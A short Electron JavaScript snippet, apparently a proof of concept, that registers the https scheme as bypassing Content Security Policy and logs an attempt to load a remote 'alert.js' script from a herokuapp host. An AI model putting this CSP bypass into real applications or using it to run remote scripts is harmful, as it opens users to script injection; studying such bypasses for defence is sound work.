const webFrame = require('electron').webFrame;

// Bypass CSP compliance using protocol scheme
webFrame.registerURLSchemeAsBypassingCSP('https');

console.log(`[WEBVIEW] Changed CSP Scheme using the scheme 'https'
Attempting to load script from the following url: 'https://hosted-script.herokuapp.com/alert.js'`);

require('./script');
